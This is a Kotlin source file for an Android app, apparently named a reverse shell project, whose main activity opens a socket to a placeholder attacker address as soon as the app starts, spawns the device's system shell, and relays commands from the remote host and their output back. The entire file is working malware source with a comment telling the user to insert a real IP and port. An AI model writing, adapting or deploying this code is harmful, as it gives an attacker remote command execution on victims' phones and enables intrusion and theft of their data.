package com.example.reverseshell

import android.os.AsyncTask
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import java.io.DataInputStream
import java.io.DataOutputStream
import java.net.Socket

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Reverse shell payload start
        ReverseShellTask().execute("ATTACKER_IP", "ATTACKER_PORT")  // Replace with actual IP and port
    }

    inner class ReverseShellTask : AsyncTask<String, Void, Void>() {
        override fun doInBackground(vararg params: String?): Void? {
            try {
                val socket = Socket(params[0], params[1]?.toInt() ?: 4444)
                val inputStream = DataInputStream(socket.getInputStream())
                val outputStream = DataOutputStream(socket.getOutputStream())
                val process = Runtime.getRuntime().exec("/system/bin/sh")

                val processInput = DataOutputStream(process.outputStream)
                val processOutput = DataInputStream(process.inputStream)

                while (true) {
                    val command = inputStream.readUTF()
                    processInput.writeBytes(command)
                    processInput.flush()

                    val buffer = ByteArray(1024)
                    var read = processOutput.read(buffer)
                    while (read != -1) {
                        outputStream.write(buffer, 0, read)
                        outputStream.flush()
                        read = processOutput.read(buffer)
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
            return null
        }
    }
}
